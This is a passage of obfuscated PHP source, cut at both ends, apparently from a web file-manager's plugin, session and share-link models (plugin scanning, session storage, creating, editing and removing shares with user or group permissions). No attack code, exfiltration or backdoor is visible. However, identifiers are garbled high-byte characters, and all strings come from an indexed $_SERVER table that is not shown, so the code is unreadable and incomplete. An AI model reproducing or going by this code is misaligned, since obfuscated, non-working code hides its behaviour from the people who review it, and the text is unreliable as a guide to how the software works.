array(); $—×ô¹ = $this->getPackageJson($‘æÔ”ùè); if (!$—×ô¹ && is_array($—×ô¹[$Ü•öÛƒÊ[2118]])) { return $’Ø×ôÜÜ; } foreach ($—×ô¹[$Ü•öÛƒÊ[2118]] as $ÈêƒÆ³ => $Æêİšæ) { if (!isset($Æêİšæ[$Ü•öÛƒÊ[461]]) || isset($’Ø×ôÜÜ[$ÈêƒÆ³])) { continue; } $’Ø×ôÜÜ[$ÈêƒÆ³] = $Æêİšæ[$Ü•öÛƒÊ[461]]; } return $’Ø×ôÜÜ; } public function getPackageJson($ó˜¶àŞ) { return Hook::apply($ó˜¶àŞ . $_SERVER[¼’ç§¼´][2119]); } public function getConfig($Åòàƒß‚, $®´ä¦ã = false) { $‡ŸµÊƒâ =& $_SERVER[¼’ç§¼´]; $ö¹ŞŞŸª = array(); $˜½Øıàİ = $this->loadList($Åòàƒß‚); if ($˜½Øıàİ && is_array($˜½Øıàİ[$‡ŸµÊƒâ[6]])) { $ö¹ŞŞŸª = $˜½Øıàİ[$‡ŸµÊƒâ[6]]; } if (!$ö¹ŞŞŸª || $®´ä¦ã) { $ö¹ŞŞŸª = $this->getConfigDefault($Åòàƒß‚); } return $ö¹ŞŞŸª; } public function setConfig($Ú•ã½½, $–Ä˜üâ” = false) { $ÖŞãìıæ =& $_SERVER[¼’ç§¼´]; $¯êÆ˜ôÍ = $this->loadList($Ú•ã½½); if (!$¯êÆ˜ôÍ) { return !1; } $çéˆÈ±Ğ = $¯êÆ˜ôÍ[$ÖŞãìıæ[6]]; if ($–Ä˜üâ” == !1) { $çéˆÈ±Ğ = array(); $–Ä˜üâ” = $this->getConfigDefault($Ú•ã½½); } foreach ($–Ä˜üâ” as $×Åï°¯Ü => $î­á‘ç”) { $çéˆÈ±Ğ[$×Åï°¯Ü] = is_string($î­á‘ç”) ? trim($î­á‘ç”) : $î­á‘ç”; } $this->update($¯êÆ˜ôÍ[$ÖŞãìıæ[486]], array($ÖŞãìıæ[6] => $çéˆÈ±Ğ)); } public function viewList() { $ÉµÔË»À =& $_SERVER[¼’ç§¼´]; $´Çƒ´µº = $this->loadList(); $this->pluginScan($´Çƒ´µº); $´Çƒ´µº = $this->loadPluginList(); $Ğ›Ë±ñ£ = array(); foreach ($´Çƒ´µº as $‡¼Ì€…ú => $ÔúšÊ°†) { $òö×èñ° = $ÔúšÊ°†; unset($ÔúšÊ°†[$ÉµÔË»À[2109]], $ÔúšÊ°†[$ÉµÔË»À[6]]); $´¾å¥ = PLUGIN_DIR . $ÔúšÊ°†[$ÉµÔË»À[32]] . $ÉµÔË»À[2111]; if (!is_file($´¾å¥)) { continue; } $Ä€Îşß = Hook::apply($ÔúšÊ°†[$ÉµÔË»À[32]] . $ÉµÔË»À[2119]); if (!is_array($Ä€Îşß)) { continue; } $Ğ›Ë±ñ£[$‡¼Ì€…ú] = array_merge($ÔúšÊ°†, $Ä€Îşß); if ($òö×èñ°[$ÉµÔË»À[6]][$ÉµÔË»À[1696]] != $Ä€Îşß[$ÉµÔË»À[1670]]) { Hook::apply($ÔúšÊ°†[$ÉµÔË»À[32]] . $ÉµÔË»À[2116]); $òö×èñ°[$ÉµÔË»À[6]][$ÉµÔË»À[1696]] = $Ä€Îşß[$ÉµÔË»À[1670]]; $this->update($ÔúšÊ°†[$ÉµÔË»À[486]], array($ÉµÔË»À[6] => $òö×èñ°[$ÉµÔË»À[6]])); } } return $Ğ›Ë±ñ£; } private function loadPluginList() { $„Æ‚…Ê¡ =& $_SERVER[¼’ç§¼´]; $ôñÕÇºÈ = $this->loadList(); if (strtolower(MOD) == $„Æ‚…Ê¡[2120]) { return $ôñÕÇºÈ; } $Åí§Ï¸ì = Hook::trigger($„Æ‚…Ê¡[2121], $ôñÕÇºÈ); if ($ôñÕÇºÈ && !$Åí§Ï¸ì) { die; } return $Åí§Ï¸ì ? $Åí§Ï¸ì : $ôñÕÇºÈ; } private function pluginScan($ÒÀ÷Â‰) { $ØÆç’ÎÍ =& $_SERVER[¼’ç§¼´]; recursion_dir(PLUGIN_DIR, $ğ£òœéñ, $ÊÏ¿çÀ¬, 0); foreach ($ğ£òœéñ as $Ğ¦°Å‡) { $ß”¤àñİ = get_path_this($Ğ¦°Å‡); if (isset($ÒÀ÷Â‰[$ß”¤àñİ]) || !file_exists($Ğ¦°Å‡ . $ØÆç’ÎÍ[2122]) || !file_exists($Ğ¦°Å‡ . $ØÆç’ÎÍ[2111])) { continue; } Hook::apply($ß”¤àñİ . $ØÆç’ÎÍ[2116]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\163\x65\x73\x73\x69\157\156"; public function get($Ïğì Âé) { $Ò¾“³üÍ =& $_SERVER[¼’ç§¼´]; $§ëñä—Ğ = $this->where(array($Ò¾“³üÍ[2123] => $Ïğì Âé))->find(); if (!is_array($§ëñä—Ğ)) { return !1; } return $§ëñä—Ğ[$Ò¾“³üÍ[171]]; } public function set($èÂÀïğ¯, $ı¥ÜÛ¤Ã, $¨±²´Ä½ = 3600) { $’¾½Ÿ™ï =& $_SERVER[¼’ç§¼´]; $·ìá° = array($’¾½Ÿ™ï[2123] => $èÂÀïğ¯, $’¾½Ÿ™ï[2023] => $ı¥ÜÛ¤Ã, $’¾½Ÿ™ï[2124] => $¨±²´Ä½ + time()); if (Session::get($’¾½Ÿ™ï[2125])) { $·ìá°[$’¾½Ÿ™ï[1783]] = Session::get($’¾½Ÿ™ï[2125]); } else { $·ìá°[$’¾½Ÿ™ï[1783]] = 0; } if ($this->get($èÂÀïğ¯)) { return $this->where(array($’¾½Ÿ™ï[2123] => $èÂÀïğ¯))->save($·ìá°); } else { return $this->add($·ìá°, array(), !0); } } public function remove($‚»”æ¸‚) { return $this->where(array($_SERVER[¼’ç§¼´][2123] => $‚»”æ¸‚))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¼’ç§¼´][2126] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\151\x6d\145", "\x74\151\155\x65", "\151\156\x73\x65\162\164\x2c\x75\160\x64\141\164\x65", "\146\x75\x6e\x63\x74\151\x6f\156"), array("\x63\x72\145\141\164\x65\x54\151\x6d\x65", "\164\151\155\145", "\151\156\x73\145\x72\x74", "\146\165\156\x63\x74\x69\x6f\x6e"), array("\x6f\x70\x74\x69\x6f\x6e\163", '', "\151\x6e\163\x65\162\164\x2c\165\160\x64\141\164\x65\x2c\x73\145\x6c\145\143\x74", "\152\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Îş½ßÅ) { $óç‘÷èÙ =& $_SERVER[¼’ç§¼´]; $Û¥©ƒÏº = isset($Îş½ßÅ[0]) ? $Îş½ßÅ[0] : !1; $¤ØƒŸß‘ = $óç‘÷èÙ[2127] . USER_ID; return array($óç‘÷èÙ[2128] => array(USER_ID, $óç‘÷èÙ[2129]), $óç‘÷èÙ[2068] => array($Û¥©ƒÏº, $óç‘÷èÙ[2130], $¤ØƒŸß‘)); } protected function listSimple() { $Ø–Ñ †Ò = array($_SERVER[¼’ç§¼´][1783] => USER_ID); $·Î–×§ = $this->field($this->fieldList)->where($Ø–Ñ †Ò)->select(); return $·Î–×§ ? $·Î–×§ : array(); } protected function getInfo($õâáîá™, $Ìäèâ„ò = false, $‰ÙÆóè½ = '') { $ˆø§™¥ß =& $_SERVER[¼’ç§¼´]; if (!$‰ÙÆóè½) { $‰ÙÆóè½ = $ˆø§™¥ß[2127] . USER_ID; } if ($Ìäèâ„ò) { return $this->_getShareInfo(array($ˆø§™¥ß[679] => $õâáîá™)); } $ö¹Ÿı’© = $this->cacheFunctionGet($ˆø§™¥ß[2070], $õâáîá™, $‰ÙÆóè½); return $ö¹Ÿı’©; } public function getInfoByHash($‹óë’«) { return $this->_getShareInfo(array($_SERVER[¼’ç§¼´][2131] => $‹óë’«)); } public function getInfoByPath($×ëÛ¹¬) { $£¯­¥Œ =& $_SERVER[¼’ç§¼´]; $ãè¼±’ = array($£¯­¥Œ[1783] => USER_ID, $£¯­¥Œ[193] => $×ëÛ¹¬); return $this->_getShareInfo($ãè¼±’); } public function getInfoBySourcePath($ÔşÛ–ƒä) { $• ‘Ú =& $_SERVER[¼’ç§¼´]; $ğ»Â‹¦™ = array($• ‘Ú[1783] => USER_ID, $• ‘Ú[1266] => $ÔşÛ–ƒä); return $this->_getShareInfo($ğ»Â‹¦™); } private function _getShareInfo($ñÂ®ú) { $éä‘ë³½ =& $_SERVER[¼’ç§¼´]; $†¾¢¤ı‚ = $this->where($ñÂ®ú)->find(); if (!$†¾¢¤ı‚) { return !1; } $ñÂ®ú = array($éä‘ë³½[679] => $†¾¢¤ı‚[$éä‘ë³½[679]]); $ø ÂÙÙ¯ = $éä‘ë³½[2132]; $ç½ˆƒŞì = Model($éä‘ë³½[680])->order($éä‘ë³½[486])->field($ø ÂÙÙ¯)->where($ñÂ®ú)->select(); if ($†¾¢¤ı‚[$éä‘ë³½[193]] == $éä‘ë³½[230]) { $†¾¢¤ı‚[$éä‘ë³½[90]] = IO::info($†¾¢¤ı‚[$éä‘ë³½[1266]]); } else { $†¾¢¤ı‚[$éä‘ë³½[90]] = Model($éä‘ë³½[1430])->pathInfo($†¾¢¤ı‚[$éä‘ë³½[193]]); } $†¾¢¤ı‚[$éä‘ë³½[2133]] = $ç½ˆƒŞì; return $†¾¢¤ı‚; } protected function getInfoAuth($§÷Ä‹–Ç) { $—•œÆÎö =& $_SERVER[¼’ç§¼´]; $Œ¼É¯Ò = $this->getInfo($§÷Ä‹–Ç); if ($Œ¼É¯Ò[$—•œÆÎö[1783]] == USER_ID) { $Œ¼É¯Ò[$—•œÆÎö[498]] = $Œ¼É¯Ò[$—•œÆÎö[90]][$—•œÆÎö[498]]; } else { $Œ¼É¯Ò[$—•œÆÎö[498]] = Model($—•œÆÎö[578])->authMake($Œ¼É¯Ò[$—•œÆÎö[2133]]); } return $Œ¼É¯Ò; } protected function listData($¯­¢¹È = null, $×‹âÍÖÈ = 300) { $¤â¯„Ïá =& $_SERVER[¼’ç§¼´]; $ŒÔªß›¤ = array(array($¤â¯„Ïá[573] => array($¤â¯„Ïá[1098], 0), $¤â¯„Ïá[677] => array($¤â¯„Ïá[1098], 0), $¤â¯„Ïá[2134] => $¤â¯„Ïá[2086])); if ($¯­¢¹È == $¤â¯„Ïá[2135]) { $ŒÔªß›¤ = array($¤â¯„Ïá[573] => 1); } else { if ($¯­¢¹È == $¤â¯„Ïá[1251]) { $ŒÔªß›¤ = array($¤â¯„Ïá[677] => 1); } } $ŒÔªß›¤[$¤â¯„Ïá[1783]] = USER_ID; $¿ÎóÊ¦­ = $this->where($ŒÔªß›¤)->selectPage($×‹âÍÖÈ); return $¿ÎóÊ¦­; } protected function listToMe($Ò‚¢¹¹” = 300) { $ß€ë˜À‘ =& $_SERVER[¼’ç§¼´]; $›½¨Û­û = Model($ß€ë˜À‘[2136])->userGroupParents(USER_ID); $È™²ÓğÍ = array($ß€ë˜À‘[662] => SourceModel::TYPE_USER, $ß€ë˜À‘[580] => USER_ID); if ($›½¨Û­û) { $È™²ÓğÍ = array(array($ß€ë˜À‘[662] => SourceModel::TYPE_USER, $ß€ë˜À‘[580] => USER_ID), array($ß€ë˜À‘[662] => SourceModel::TYPE_GROUP, $ß€ë˜À‘[580] => array($ß€ë˜À‘[7], $›½¨Û­û)), $ß€ë˜À‘[2134] => $ß€ë˜À‘[2086]); } $Ÿ–Õ¯’€ = Model($ß€ë˜À‘[680])->where($È™²ÓğÍ)->selectPage($Ò‚¢¹¹”); $±ÒÛ˜ = array_to_keyvalue_group($Ÿ–Õ¯’€[$ß€ë˜À‘[456]], $ß€ë˜À‘[679]); if (!$±ÒÛ˜) { return $Ÿ–Õ¯’€; } $ÅÄ˜›»Î = $ß€ë˜À‘[2137]; $È™²ÓğÍ = array($ß€ë˜À‘[679] => array($ß€ë˜À‘[503], array_keys($±ÒÛ˜)), $ß€ë˜À‘[1783] => array($ß€ë˜À‘[1100], $ß€ë˜À‘[230])); $ Şœõí = $this->field($ÅÄ˜›»Î)->where($È™²ÓğÍ)->select(); foreach ($ Şœõí as $«„ù‹–¢ => &$”ï‡èïô) { $”ï‡èïô[$ß€ë˜À‘[2133]] = $±ÒÛ˜[$”ï‡èïô[$ß€ë˜À‘[679]]]; } unset($”ï‡èïô); $İÆ×ıÍØ = array($ß€ë˜À‘[2138] => $ Şœõí, $ß€ë˜À‘[2139] => $Ÿ–Õ¯’€[$ß€ë˜À‘[453]]); return $İÆ×ıÍØ; } protected function shareAdd($»üò¹ÖÏ, $ê‹Í«Çê) { $ÅñÒÉ¢à =& $_SERVER[¼’ç§¼´]; $ñÁù§« = $this->_addShareData($»üò¹ÖÏ, $ê‹Í«Çê); if (!empty($ê‹Í«Çê[$ÅñÒÉ¢à[2140]])) { $this->_shareAuthSet($ñÁù§«, $ê‹Í«Çê[$ÅñÒÉ¢à[2140]]); } $this->shareEventAdd($»üò¹ÖÏ, $ê‹Í«Çê, $ÅñÒÉ¢à[2141]); return $ñÁù§«; } protected function shareAddSystem($ßÙ£¼öÎ, $‹˜×Ğ) { $º¿Õºéó =& $_SERVER[¼’ç§¼´]; $³…·É— = $this->_addShareData($ßÙ£¼öÎ, $‹˜×Ğ, $º¿Õºéó[191]); $this->_shareAuthSet($³…·É—, $‹˜×Ğ[$º¿Õºéó[2140]]); return $³…·É—; } private function shareEventAdd($Åİİ¸Ç, $—š‹¹Ñó, $ñÙ÷¥®ï = "\x61\144\x64") { $®«ÌöÆÇ =& $_SERVER[¼’ç§¼´]; if (!$Åİİ¸Ç || $Åİİ¸Ç == $®«ÌöÆÇ[230]) { return; } if ($ñÙ÷¥®ï == $®«ÌöÆÇ[2141]) { if ($—š‹¹Ñó[$®«ÌöÆÇ[573]] == $®«ÌöÆÇ[91]) { Model($®«ÌöÆÇ[647])->eventShare($Åİİ¸Ç, $®«ÌöÆÇ[2142]); } if ($—š‹¹Ñó[$®«ÌöÆÇ[677]] == $®«ÌöÆÇ[91]) { Model($®«ÌöÆÇ[647])->eventShare($Åİİ¸Ç, $®«ÌöÆÇ[2143]); } return; } $Ã½‹ş¹û = $this->getInfoByPath($Åİİ¸Ç); $¾ë½‹Õº = $®«ÌöÆÇ[2144]; if ($Ã½‹ş¹û[$®«ÌöÆÇ[573]] == $®«ÌöÆÇ[230] && $—š‹¹Ñó[$®«ÌöÆÇ[573]] == $®«ÌöÆÇ[91]) { $¾ë½‹Õº = $®«ÌöÆÇ[2142]; } if ($Ã½‹ş¹û[$®«ÌöÆÇ[573]] == $®«ÌöÆÇ[91] && $—š‹¹Ñó[$®«ÌöÆÇ[573]] == $®«ÌöÆÇ[230]) { $¾ë½‹Õº = $®«ÌöÆÇ[2145]; } if ($Ã½‹ş¹û[$®«ÌöÆÇ[677]] == $®«ÌöÆÇ[230] && $—š‹¹Ñó[$®«ÌöÆÇ[677]] == $®«ÌöÆÇ[91]) { $¾ë½‹Õº = $®«ÌöÆÇ[2143]; } if ($Ã½‹ş¹û[$®«ÌöÆÇ[677]] == $®«ÌöÆÇ[91] && $—š‹¹Ñó[$®«ÌöÆÇ[677]] == $®«ÌöÆÇ[230]) { $¾ë½‹Õº = $®«ÌöÆÇ[2146]; } Model($®«ÌöÆÇ[647])->eventShare($Åİİ¸Ç, $¾ë½‹Õº); return; } private function _addShareData($—¶ü ø, $²Ì®¿°ş = array(), $ —Ë›Ö = false) { $á‘õø£ =& $_SERVER[¼’ç§¼´]; $æŸÂà = $ —Ë›Ö == $á‘õø£[191] ? 0 : USER_ID; $ñëÕœ´ = array($á‘õø£[502] => $—¶ü ø, $á‘õø£[1774] => $æŸÂà); if ($—¶ü ø == 0) { $ñëÕœ´ = array($á‘õø£[2147] => $²Ì®¿°ş[$á‘õø£[1266]], $á‘õø£[1774] => $æŸÂà); } if ($Œ¦ÊÒÖï = $this->where($ñëÕœ´)->find()) { return $Œ¦ÊÒÖï[$á‘õø£[679]]; } if ($—¶ü ø == 0) { $™¹ÏÇûÒ = array($á‘õø£[32] => get_path_this($²Ì®¿°ş[$á‘õø£[87]])); } else { $™¹ÏÇûÒ = Model($á‘õø£[913])->sourceInfo($—¶ü ø); if (!$™¹ÏÇûÒ) { return !1; } } if (!$²Ì®¿°ş[$á‘õø£[1671]]) { $²Ì®¿°ş[$á‘õø£[1671]] = $™¹ÏÇûÒ[$á‘õø£[32]]; } $¯‘òèØ¥ = array($á‘õø£[1774] => $æŸÂà, $á‘õø£[502] => $—¶ü ø, $á‘õø£[1671] => $á‘õø£[12], $á‘õø£[573] => 0, $á‘õø£[677] => 0, $á‘õø£[1266] => $á‘õø£[12], $á‘õø£[384] => $á‘õø£[12], $á‘õø£[975] => $á‘õø£[12], $á‘õø£[2148] => 0, $á‘õø£[2149] => 0, $á‘õø£[849] => 0, $á‘õø£[2150] => $á‘õø£[12], $á‘õø£[2131] => $á‘õø£[12]); $ÁÄÛ¥À = explode($á‘õø£[50], $á‘õø£[2151]); foreach ($ÁÄÛ¥À as $€áÏáö) { if (!isset($²Ì®¿°ş[$€áÏáö])) { continue; } $¯‘òèØ¥[$€áÏáö] = $²Ì®¿°ş[$€áÏáö]; } $ƒŠ¨ñª = $this->add($¯‘òèØ¥); $éÚƒ’œ¹ = array($á‘õø£[2131] => short_id($ƒŠ¨ñª)); $this->where(array($á‘õø£[2152] => $ƒŠ¨ñª))->save($éÚƒ’œ¹); return $ƒŠ¨ñª; } private function _shareAuthSet($õöÍ•·ß, $Œñßµ¹Í) { $¤¬şò§û =& $_SERVER[¼’ç§¼´]; if (!is_array($Œñßµ¹Í)) { return !1; } $Ü§ºôÈ¨ = Model($¤¬şò§û[2096]); $Ü§ºôÈ¨->where(array($¤¬şò§û[679] => $õöÍ•·ß))->delete(); $ß˜şÚ”€ = array(); foreach ($Œñßµ¹Í as $Ü¢›¼¬Â) { $ı¼ıº™‘ = SourceModel::TYPE_USER; if ($Ü¢›¼¬Â[$¤¬şò§û[190]] == SourceModel::TYPE_GROUP) { $ı¼ıº™‘ = SourceModel::TYPE_GROUP; } $†ï‰ Éï = array($¤¬şò§û[679] => $õöÍ•·ß, $¤¬şò§û[190] => $ı¼ıº™‘, $¤¬şò§û[580] => intval($Ü¢›¼¬Â[$¤¬şò§û[580]]), $¤¬şò§û[2092] => 0, $¤¬şò§û[2153] => -1); if ($Ü¢›¼¬Â[$¤¬şò§û[2092]]) { $†ï‰ Éï[$¤¬şò§û[2092]] = $Ü¢›¼¬Â[$¤¬şò§û[2092]]; } else { if ($Ü¢›¼¬Â[$¤¬şò§û[2153]]) { $†ï‰ Éï[$¤¬şò§û[2153]] = $Ü¢›¼¬Â[$¤¬şò§û[2153]]; } } $ß˜şÚ”€[] = $†ï‰ Éï; } return $Ü§ºôÈ¨->addAll($ß˜şÚ”€, array(), !0); } public function numViewAdd($«ˆ§„ªä) { $‘šŠâŠı =& $_SERVER[¼’ç§¼´]; $öığâ²ì = array($‘šŠâŠı[2152] => $«ˆ§„ªä); $this->where($öığâ²ì)->setAdd($‘šŠâŠı[2148]); } public function numDownloadAdd($ÁˆÖ„óÉ) { $«Ğ÷ƒı§ =& $_SERVER[¼’ç§¼´]; $ÙùÁ•ê× = array($«Ğ÷ƒı§[2152] => $ÁˆÖ„óÉ); $this->where($ÙùÁ•ê×)->setAdd($«Ğ÷ƒı§[2149]); } protected function shareEdit($¹ÒÂ¹Ç™, $÷§Ò‚¨) { $õÁœ¶øì =& $_SERVER[¼’ç§¼´]; $²Ûšõè‚ = $this->getInfo($¹ÒÂ¹Ç™); if (!$²Ûšõè‚) { return !1; } $this->_checkLinkShare($÷§Ò‚¨, $²Ûšõè‚); $“„Ú”Šƒ = array(); $Óˆ‚Öêß = explode($õÁœ¶øì[50], $õÁœ¶øì[2154]); foreach ($Óˆ‚Öêß as $¥«µáÆÑ) { if (!array_key_exists($¥«µáÆÑ, $÷§Ò‚¨)) { continue; } $“„Ú”Šƒ[$¥«µáÆÑ] = $÷§Ò‚¨[$¥«µáÆÑ]; } $this->shareEventAdd($²Ûšõè‚[$õÁœ¶øì[193]], $÷§Ò‚¨, $õÁœ¶øì[1953]); $this->where(array($õÁœ¶øì[2152] => $¹ÒÂ¹Ç™))->save($“„Ú”Šƒ); if (isset($÷§Ò‚¨[$õÁœ¶øì[2140]])) { $this->_shareAuthSet($¹ÒÂ¹Ç™, $÷§Ò‚¨[$õÁœ¶øì[2140]]); } return !0; } private function _checkLinkShare($Áä½è°ì, $ ­ÈºÈ„) { $äìæü†É =& $_SERVER[¼’ç§¼´]; if ($Áä½è°ì[$äìæü†É[573]] != $äìæü†É[91]) { return; } $şãª˜é = $ ­ÈºÈ„[$äìæü†É[90]][$äìæü†É[193]]; if ($ ­ÈºÈ„[$äìæü†É[90]][$äìæü†É[33]] != $äìæü†É[232]) { $µî¿ê©Ÿ = $this->_folderReport($şãª˜é); if (!$µî¿ê©Ÿ) { return; } show_json(LNG($äìæü†É[2155]) . $äìæü†É[2156] . $µî¿ê©Ÿ, !1); } $µÒ§ä¼è = Model($äìæü†É[913])->fileInfoGet($ ­ÈºÈ„[$äìæü†É[90]][$äìæü†É[193]]); if (!$µÒ§ä¼è) { return; } $­šÊæ£‹ = $this->shareFileMeta($µÒ§ä¼è[$äìæü†É[552]]); if (isset($­šÊæ£‹[$äìæü†É[461]]) && $­šÊæ£‹[$äìæü†É[461]] == $äìæü†É[91]) { show_json(LNG($äìæü†É[2157]), !1); } } private function _folderReport($›ôÒ°–¬) { $ëŒ©¶¤Æ =& $_SERVER[¼’ç§¼´]; $Â¨˜Õ‘ = array($ëŒ©¶¤Æ[552] => array($ëŒ©¶¤Æ[1098], 0), $ëŒ©¶¤Æ[838] => 3); $ÁÌÖş‡Ö = Model($ëŒ©¶¤Æ[2158])->where($Â¨˜Õ‘)->field($ëŒ©¶¤Æ[552])->select(); if (!$ÁÌÖş‡Ö) { return !1; } $ÁÌÖş‡Ö = array_to_keyvalue($ÁÌÖş‡Ö, $ëŒ©¶¤Æ[12], $ëŒ©¶¤Æ[552]); $Şâœ‚¡Ø = $ëŒ©¶¤Æ[50] . $›ôÒ°–¬ . $ëŒ©¶¤Æ[50]; $Â¨˜Õ‘ = array($ëŒ©¶¤Æ[552] => array($ëŒ©¶¤Æ[7], $ÁÌÖş‡Ö), $ëŒ©¶¤Æ[595] => array($ëŒ©¶¤Æ[470], "\x25{$Şâœ‚¡Ø}\45"), $ëŒ©¶¤Æ[516] => 0); $º«ÀÈÉÌ = Model($ëŒ©¶¤Æ[913])->where($Â¨˜Õ‘)->field($ëŒ©¶¤Æ[2159])->find(); if (!$º«ÀÈÉÌ) { return !1; } $Ê™­„Ìè = substr($º«ÀÈÉÌ[$ëŒ©¶¤Æ[595]], strpos($º«ÀÈÉÌ[$ëŒ©¶¤Æ[595]], $Şâœ‚¡Ø)); $Â¨˜Õ‘ = array($ëŒ©¶¤Æ[193] => array($ëŒ©¶¤Æ[7], trim($Ê™­„Ìè, $ëŒ©¶¤Æ[50]))); $ÓÆÖ¡´ = Model($ëŒ©¶¤Æ[913])->where($Â¨˜Õ‘)->field($ëŒ©¶¤Æ[32])->select(); $ßğ…İ°‡ = array_to_keyvalue($ÓÆÖ¡´, $ëŒ©¶¤Æ[12], $ëŒ©¶¤Æ[32]); $ßğ…İ°‡[] = $º«ÀÈÉÌ[$ëŒ©¶¤Æ[32]]; return implode($ëŒ©¶¤Æ[8], $ßğ…İ°‡); } protected function remove($ì¶Ã›ˆÎ) { $‘Å·Ê„Ş =& $_SERVER[¼’ç§¼´]; $Õßò‹ëŞ = is_array($ì¶Ã›ˆÎ) ? $ì¶Ã›ˆÎ : array($ì¶Ã›ˆÎ); for ($´«ƒö–ø = 0; $´«ƒö–ø < count($Õßò‹ëŞ); $´«ƒö–ø++) { $©àïíªâ = $this->getInfo($Õßò‹ëŞ[$´«ƒö–ø]); if ($©àïíªâ[$‘Å·Ê„Ş[677]] == $‘Å·Ê„Ş[91]) { Model($‘Å·Ê„Ş[647])->eventShare($©àïíªâ[$‘Å·Ê„Ş[193]], $‘Å·Ê„Ş[2146]); } if ($©àïíªâ[$‘Å·Ê„Ş[573]] == $‘Å·Ê„Ş[91]) { Model($‘Å·Ê„Ş[647])->eventShare($©àïíªâ[$‘Å·Ê„Ş[193]], $‘Å·Ê„Ş[2145]); } } if (is_array($ì¶Ã›ˆÎ)) { $ì¶Ã›ˆÎ = array($‘Å·Ê„Ş[7], $ì¶Ã›ˆÎ); } $¦‡ß†˜â = array($‘Å·Ê„Ş[679] => $ì¶Ã›ˆÎ); $ó•·¤Ô = $this->where($¦‡ß†˜â)->delete(); if ($ó•·¤Ô) { Model($‘Å·Ê„Ş[680])->where(array($‘Å·Ê„Ş[679] => $ì¶Ã›ˆÎ))->delete(); } return $ó•·¤Ô; } protected function removeBySource($ç¦‰Şöë) { $Ë¾æıÇÑ =& $_SERVER[¼’ç§¼´]; $§Ù¶ğ¯ô = array($Ë¾æıÇÑ[502] => array($Ë¾æıÇÑ[503], $ç¦‰Şöë)); $ÌÏååô‹ = $this->field($Ë¾æıÇÑ[679])->where($§Ù¶ğ¯ô)->select(); $ÌÏååô‹ = array_to_keyvalue($ÌÏååô‹, $Ë¾æıÇÑ[12], $Ë¾æıÇÑ[679]); if (!$ÌÏååô‹) { return; } $§Ù¶ğ¯ô = array($Ë¾æıÇÑ[2152] => array($Ë¾æıÇÑ[503], $ÌÏååô‹)); $this->where($§Ù¶ğ¯ô)->delete(); Model($Ë¾æıÇÑ[680])->where($§Ù¶ğ¯ô)->delete(); } public function listAll($ŸïÛ÷£é) { $òÏñé¦â =& $_SERVER[¼’ç§¼´]; $Ÿ£©©Ì = array(); if ($ŸïÛ÷£é[$òÏñé¦â[1783]]) { $Ÿ£©©Ì[$òÏñé¦â[1783]] = $ŸïÛ÷£é[$òÏñé¦â[1783]]; } if ($ŸïÛ÷£é[$òÏñé¦â[848]]) { $¥öï¾²˜ = $ŸïÛ÷£é[$òÏñé¦â[849]] ? $ŸïÛ÷£é[$òÏñé¦â[849]] : strtotime(date($òÏñé¦â[2160])); $Ÿ£©©Ì[$òÏñé¦â[233]] = array($òÏñé¦â[410], array($ŸïÛ÷£é[$òÏñé¦â[848]], $¥öï¾²˜)); } if ($ŸïÛ÷£é[$òÏñé¦â[33]]) { $Ÿ£©©Ì[$ŸïÛ÷£é[$òÏñé¦â[33]]] = 1; } else { $Ÿ£©©Ì[] = array($òÏñé¦â[573] => array($òÏñé¦â[1098], 0), $òÏñé¦â[677] => array($òÏñé¦â[1098], 0), $òÏñé¦â[2134] => $òÏñé¦â[2086]); } if ($ŸïÛ÷£é[$òÏñé¦â[2082]]) { $Ÿ£©©Ì[] = array($òÏñé¦â[2131] => $ŸïÛ÷£é[$òÏñé¦â[2082]], $òÏñé¦â[1671] => array($òÏñé¦â[470], "\x25{$ŸïÛ÷£é[$òÏñé¦â[2082]]}\x25"), $òÏñé¦â[2134] => $òÏñé¦â[2086]); } $½›»•™Ê = $this->_makeOrder()->where($Ÿ£©©Ì)->selectPage(20); if (empty($½›»•™Ê[$òÏñé¦â[456]])) { return array(); } $this->_listDataApply($½›»•™Ê[$òÏñé¦â[456]]); return $½›»•™Ê; } public function listDataApply($Ã‘¢·©„) { $this->_listDataApply($Ã‘¢·©„); return $Ã‘¢·©„; } private function _listDataApply(&$«—·ŒÓ) { $Â›áà¯ =& $_SERVER[¼’ç§¼´]; $¤ÚŠ“½¼ = array_to_keyvalue($«—·ŒÓ, $Â›áà¯[12], $Â›áà¯[1783]); $ö•Ú‡õİ = Model($Â›áà¯[608])->userListInfo(array_unique($¤ÚŠ“½¼)); $Ä¸îšù™ = array_to_keyvalue($«—·ŒÓ, $Â›áà¯[12], $Â›áà¯[193]); $¢¥¿«í = Model($Â›áà¯[913])->sourceListInfo($Ä¸îšù™, !0); foreach ($«—·ŒÓ as $‰¨Øıãï => &$ÓÄİâŸœ) { $¬ÕÁ“æ® = $ÓÄİâŸœ[$Â›áà¯[1783]]; $ÓÄİâŸœ[$Â›áà¯[2161]] = $ö•Ú‡õİ[$¬ÕÁ“æ®] ? $ö•Ú‡õİ[$¬ÕÁ“æ®] : !1; $ïáí“©È = $ÓÄİâŸœ[$Â›áà¯[193]]; $ÓÄİâŸœ[$Â›áà¯[90]] = $¢¥¿«í[$ïáí“©È] ? $¢¥¿«í[$ïáí“©È] : !1; if ($ÓÄİâŸœ[$Â›áà¯[90]][$Â›áà¯[516]] == $Â›áà¯[91]) { unset($«—·ŒÓ[$‰¨Øıãï]); } if ($ÓÄİâŸœ[$Â›áà¯[90]] != $Â›áà¯[230] && !$ÓÄİâŸœ[$Â›áà¯[90]]) { unset($«—·ŒÓ[$‰¨Øıãï]); } } unset($ÓÄİâŸœ); $«—·ŒÓ = array_values($«—·ŒÓ); } private function _makeOrder($£ÖÇ½á = '') { $ šèœ¨¹ =& $_SERVER[¼’ç§¼´]; $ĞòÛÒÜÓ = array($ šèœ¨¹[233], $ šèœ¨¹[849], $ šèœ¨¹[2148], $ šèœ¨¹[2149]); $çÖîÅêø = array($ šèœ¨¹[534] => $ šèœ¨¹[535], $ šèœ¨¹[536] => $ šèœ¨¹[537]); $‰Œµ›üÅ = Input::get($ šèœ¨¹[541], $ šèœ¨¹[7], $ šèœ¨¹[508], $ĞòÛÒÜÓ); $ÃÎøÁ = Input::get($ šèœ¨¹[542], $ šèœ¨¹[7], $ šèœ¨¹[2162], array($ šèœ¨¹[2079], $ šèœ¨¹[536])); $ÃÎøÁ = $çÖîÅêø[$ÃÎøÁ]; $£ÖÇ½á = $£ÖÇ½á . 